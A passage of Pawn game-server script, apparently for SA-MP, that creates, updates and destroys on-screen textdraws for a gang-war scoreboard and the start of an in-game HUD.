		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][1], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][1], 255);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][1], 1);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][1], 1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][1], 0);

		WAR_pTD[playerid][2] = CreatePlayerTextDraw(playerid, 159.833328, 412.632995, "box");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][2], 0.000000, -0.333330);
		PlayerTextDrawTextSize(playerid, WAR_pTD[playerid][2], 263.121093, 0.000000);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][2], 1);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][2], -1);
		PlayerTextDrawUseBox(playerid, WAR_pTD[playerid][2], 1);
		PlayerTextDrawBoxColor(playerid, WAR_pTD[playerid][2], 445966079);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][2], 0);
		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][2], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][2], 255);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][2], 1);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][2], 1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][2], 0);

		WAR_pTD[playerid][3] = CreatePlayerTextDraw(playerid, 159.833328, 358.329681, "box");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][3], 0.000000, -0.333330);
		PlayerTextDrawTextSize(playerid, WAR_pTD[playerid][3], 189.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][3], 1);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][3], -1);
		PlayerTextDrawUseBox(playerid, WAR_pTD[playerid][3], 1);
		PlayerTextDrawBoxColor(playerid, WAR_pTD[playerid][3], 445966079);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][3], 0);
		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][3], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][3], 255);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][3], 1);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][3], 1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][3], 0);

		WAR_pTD[playerid][4] = CreatePlayerTextDraw(playerid, 233.837844, 358.329681, "box");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][4], 0.000000, -0.333330);
		PlayerTextDrawTextSize(playerid, WAR_pTD[playerid][4], 263.004516, 0.000000);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][4], 1);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][4], -1);
		PlayerTextDrawUseBox(playerid, WAR_pTD[playerid][4], 1);
		PlayerTextDrawBoxColor(playerid, WAR_pTD[playerid][4], 445966079);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][4], 0);
		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][4], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][4], 255);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][4], 1);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][4], 1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][4], 0);

		WAR_pTD[playerid][5] = CreatePlayerTextDraw(playerid, 234.037857, 413.033020, "box");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][5], 0.000000, -0.333330);
		PlayerTextDrawTextSize(playerid, WAR_pTD[playerid][5], 263.204528, 0.000000);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][5], 1);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][5], -1);
		PlayerTextDrawUseBox(playerid, WAR_pTD[playerid][5], 1);
		PlayerTextDrawBoxColor(playerid, WAR_pTD[playerid][5], 445966079);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][5], 0);
		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][5], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][5], 255);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][5], 1);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][5], 1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][5], 0);

		WAR_pTD[playerid][6] = CreatePlayerTextDraw(playerid, 159.833328, 413.033020, "box");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][6], 0.000000, -0.333330);
		PlayerTextDrawTextSize(playerid, WAR_pTD[playerid][6], 189.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][6], 1);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][6], -1);
		PlayerTextDrawUseBox(playerid, WAR_pTD[playerid][6], 1);
		PlayerTextDrawBoxColor(playerid, WAR_pTD[playerid][6], 445966079);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][6], 0);
		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][6], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][6], 255);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][6], 1);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][6], 1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][6], 0);

		WAR_pTD[playerid][7] = CreatePlayerTextDraw(playerid, 159.833328, 357.929656, "box");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][7], 0.000000, -0.299997);
		PlayerTextDrawTextSize(playerid, WAR_pTD[playerid][7], 176.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][7], 1);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][7], -1);
		PlayerTextDrawUseBox(playerid, WAR_pTD[playerid][7], 1);
		PlayerTextDrawBoxColor(playerid, WAR_pTD[playerid][7], 445966079);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][7], 0);
		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][7], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][7], 255);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][7], 1);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][7], 1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][7], 0);

		WAR_pTD[playerid][8] = CreatePlayerTextDraw(playerid, 246.838638, 357.929656, "box");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][8], 0.000000, -0.299997);
		PlayerTextDrawTextSize(playerid, WAR_pTD[playerid][8], 263.005310, 0.000000);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][8], 1);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][8], -1);
		PlayerTextDrawUseBox(playerid, WAR_pTD[playerid][8], 1);
		PlayerTextDrawBoxColor(playerid, WAR_pTD[playerid][8], 445966079);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][8], 0);
		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][8], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][8], 255);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][8], 1);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][8], 1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][8], 0);

		WAR_pTD[playerid][9] = CreatePlayerTextDraw(playerid, 246.838638, 413.333038, "box");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][9], 0.000000, -0.299997);
		PlayerTextDrawTextSize(playerid, WAR_pTD[playerid][9], 263.005310, 0.000000);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][9], 1);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][9], -1);
		PlayerTextDrawUseBox(playerid, WAR_pTD[playerid][9], 1);
		PlayerTextDrawBoxColor(playerid, WAR_pTD[playerid][9], 445966079);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][9], 0);
		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][9], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][9], 255);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][9], 1);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][9], 1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][9], 0);

		WAR_pTD[playerid][10] = CreatePlayerTextDraw(playerid, 159.833328, 413.333038, "box");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][10], 0.000000, -0.299997);
		PlayerTextDrawTextSize(playerid, WAR_pTD[playerid][10], 176.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][10], 1);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][10], -1);
		PlayerTextDrawUseBox(playerid, WAR_pTD[playerid][10], 1);
		PlayerTextDrawBoxColor(playerid, WAR_pTD[playerid][10], 445966079);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][10], 0);
		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][10], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][10], 255);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][10], 1);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][10], 1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][10], 0);

		WAR_pTD[playerid][11] = CreatePlayerTextDraw(playerid, 151.066833, 353.537078, "+");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][11], 0.147330, 0.621037);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][11], 1);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][11], 445966079);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][11], 0);
		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][11], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][11], 255);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][11], 2);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][11], 1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][11], 0);

		WAR_pTD[playerid][12] = CreatePlayerTextDraw(playerid, 267.866729, 408.892761, "+");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][12], 0.156663, 0.641776);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][12], 1);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][12], 445966079);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][12], 0);
		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][12], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][12], 255);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][12], 2);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][12], 1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][12], 0);

		WAR_pTD[playerid][13] = CreatePlayerTextDraw(playerid, 191.866729, 367.426086, "");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][13], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, WAR_pTD[playerid][13], 40.000000, 33.000000);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][13], 1);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][13], -239);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][13], 0);
		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][13], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][13], 0);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][13], 5);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][13], 0);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][13], 0);
		PlayerTextDrawSetPreviewModel(playerid, WAR_pTD[playerid][13], 1313);
		PlayerTextDrawSetPreviewRot(playerid, WAR_pTD[playerid][13], 0.000000, 0.000000, 0.000000, 1.000000);

		WAR_pTD[playerid][14] = CreatePlayerTextDraw(playerid, 212.133392, 357.485076, "war_::_(00:00)");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][14], 0.115331, 0.724740);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][14], 2);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][14], -1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][14], 0);
		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][14], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][14], 255);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][14], 2);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][14], 1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][14], 0);

		WAR_pTD[playerid][15] = CreatePlayerTextDraw(playerid, 178.766738, 373.248138, "-_t1_-");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][15], 0.115331, 0.612739);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][15], 2);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][15], -1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][15], 0);
		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][15], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][15], 255);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][15], 2);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][15], 1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][15], 0);

		WAR_pTD[playerid][16] = CreatePlayerTextDraw(playerid, 246.170852, 372.833312, "-_t2_-");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][16], 0.115331, 0.612739);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][16], 2);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][16], -1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][16], 0);
		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][16], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][16], 255);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][16], 2);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][16], 1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][16], 0);

		WAR_pTD[playerid][17] = CreatePlayerTextDraw(playerid, 180.566848, 383.148742, "kills:_00~n~deaths:_00~n~players:_00/00");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][17], 0.115331, 0.612739);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][17], 2);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][17], -1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][17], 0);
		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][17], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][17], 255);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][17], 2);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][17], 1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][17], 0);

		WAR_pTD[playerid][18] = CreatePlayerTextDraw(playerid, 245.300109, 383.489593, "kills:_00~n~deaths:_00~n~players:_00/00");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][18], 0.115331, 0.612739);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][18], 2);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][18], -1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][18], 0);
		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][18], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][18], 255);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][18], 2);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][18], 1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][18], 0);

		for( new i = 0; i < 19; i ++) PlayerTextDrawShow( playerid, WAR_pTD[ playerid ][ i ] );
	}
	else if( show == false )
	{
		for( new i = 0; i < 19; i ++ )
		{
			PlayerTextDrawHide( playerid, WAR_pTD[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, WAR_pTD[ playerid ][ i ] );
			WAR_pTD[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
	}
}

_:public SetWarStatsTD( w )
{
	new string[ 128 ], stringcic[ 10 ];
	foreach( new id : Player)
	{
 		if( WARPInfo[ id ][ WARIgrac ] == w )
		 {
			format( stringcic, sizeof( stringcic ), "- %s -", org_info[ PlayerInfo[ WARInfo[ w ][ WARTimLider ][ 0 ] ][ xLider ] ][ oPreFix ] );
			PlayerTextDrawSetString( id, WAR_pTD[ id ][ 15 ],  stringcic );
			format( string, sizeof( string ), "~g~kills: ~w~%d~n~~r~deaths: ~w~%d~n~~y~players: ~w~%d", WARInfo[ w ][ WARTimSkor ][ 0 ], WARInfo[ w ][ WARTimSkor ][ 1 ], WARInfo[ w ][ WARTimClanovi ][ 0 ] );
			PlayerTextDrawSetString( id, WAR_pTD[ id ][ 17 ],  string );

			format( stringcic, sizeof( stringcic ), "- %s -", org_info[ PlayerInfo[ WARInfo[ w ][ WARTimLider ][ 1 ] ][ xLider ] ][ oPreFix ] );
			PlayerTextDrawSetString( id, WAR_pTD[ id ][ 16 ],  stringcic );
			format( string, sizeof( string ), "~g~kills: ~w~%d~n~~r~deaths: ~w~%d~n~~y~players: ~w~%d", WARInfo[ w ][ WARTimSkor ][ 1 ], WARInfo[ w ][ WARTimSkor ][ 0 ], WARInfo[ w ][ WARTimClanovi ][ 1 ] );
			PlayerTextDrawSetString( id, WAR_pTD[ id ][ 18 ],  string );
		}
	}
}

_:public DestroyPlayerTextDraws( playerid )
{
    if( ShowedRegister[ playerid ] == true ) RegisterTDControl( playerid, false );

    if( ShowedLogin[ playerid ] == true ) Login_TDControl( playerid, false );

    if( tdm_tds_showed[ playerid ] == true ) tdmTDControl( playerid, false );

	BuildIngameTextDraws(playerid, false);

	BuildSpeedoTextDraws(playerid, false);

	PlayerTextDrawDestroy( playerid, SpecTextDraw[ playerid ] );
	SpecTextDraw[ playerid ] = PlayerText:INVALID_TEXT_DRAW;

    for( new i = 0; i < 2; i ++)
	{
		PlayerTextDrawDestroy( playerid, WantedLevel_pTD[ playerid ][ i ] );
		WantedLevel_pTD[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
	}
}

_:public BuildIngameTextDraws(playerid, bool:show)
{
	if(show == true) 
	{
		for(new b; b < 5; b++) TextDrawShowForPlayer( playerid, Ingame_gTD[ b ] );
		for(new i; i < 41; i++) 
		{
			PlayerTextDrawHide( playerid, Ingame_pTD[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, Ingame_pTD[ playerid ][ i ] );
			Ingame_pTD[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}

		SMG_SetHealthBarColor(playerid, PlayerInfo[playerid][xTDColor]);

		Ingame_pTD[playerid][0] = CreatePlayerTextDraw(playerid, 71.766700, 432.231353, "box");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][0], 0.000000, 1.275560);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][0], 569.461547, 0.000000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][0], 1);
		PlayerTextDrawColor(playerid, Ingame_pTD[playerid][0], -1);
		PlayerTextDrawUseBox(playerid, Ingame_pTD[playerid][0], 1);
		PlayerTextDrawBoxColor(playerid, Ingame_pTD[playerid][0], 105);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][0], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][0], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][0], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][0], 1);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][0], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][0], 0);

		Ingame_pTD[playerid][1] = CreatePlayerTextDraw(playerid, 496.666656, 3.177783, "ld_beat:chit");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][1], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][1], 17.000000, 16.000000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][1], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][1]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][1], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][1], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][1], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][1], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][1], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][1], 0);

		Ingame_pTD[playerid][2] = CreatePlayerTextDraw(playerid, 505.111175, 3.177783, "ld_beat:chit");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][2], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][2], 17.000000, 16.000000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][2], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][2]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][2], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][2], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][2], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][2], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][2], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][2], 0);

		Ingame_pTD[playerid][3] = CreatePlayerTextDraw(playerid, 513.844787, 3.177783, "ld_beat:chit");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][3], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][3], 17.000000, 16.000000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][3], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][3]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][3], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][3], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][3], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][3], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][3], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][3], 0);

		Ingame_pTD[playerid][4] = CreatePlayerTextDraw(playerid, 522.744750, 2.977782, "ld_beat:chit");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][4], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][4], 17.000000, 16.000000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][4], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][4]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][4], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][4], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][4], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][4], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][4], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][4], 0);

		Ingame_pTD[playerid][5] = CreatePlayerTextDraw(playerid, 531.666503, 3.177783, "ld_beat:chit");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][5], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][5], 17.000000, 16.000000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][5], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][5]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][5], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][5], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][5], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][5], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][5], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][5], 0);

		Ingame_pTD[playerid][6] = CreatePlayerTextDraw(playerid, 540.688232, 3.177783, "ld_beat:chit");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][6], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][6], 17.000000, 16.000000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][6], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][6]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][6], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][6], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][6], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][6], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][6], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][6], 0);

		Ingame_pTD[playerid][7] = CreatePlayerTextDraw(playerid, 549.443603, 3.177783, "ld_beat:chit");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][7], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][7], 17.000000, 16.000000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][7], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][7]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][7], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][7], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][7], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][7], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][7], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][7], 0);

		Ingame_pTD[playerid][8] = CreatePlayerTextDraw(playerid, 558.420715, 3.177783, "ld_beat:chit");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][8], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][8], 17.000000, 16.000000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][8], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][8]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][8], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][8], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][8], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][8], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][8], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][8], 0);

		Ingame_pTD[playerid][9] = CreatePlayerTextDraw(playerid, 507.187774, 6.813313, "u");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][9], 0.179222, 0.862308);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][9], 3);
		PlayerTextDrawColor(playerid, Ingame_pTD[playerid][9], -1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][9], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][9], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][9], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][9], 2);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][9], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][9], 0);

		Ingame_pTD[playerid][10] = CreatePlayerTextDraw(playerid, 516.165954, 6.813313, "l");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][10], 0.179222, 0.862308);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][10], 3);
		PlayerTextDrawColor(playerid, Ingame_pTD[playerid][10], -1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][10], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][10], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][10], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][10], 2);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][10], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][10], 0);

		Ingame_pTD[playerid][11] = CreatePlayerTextDraw(playerid, 524.710632, 6.813313, "t");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][11], 0.179222, 0.862308);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][11], 3);
		PlayerTextDrawColor(playerid, Ingame_pTD[playerid][11], -1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][11], 0);
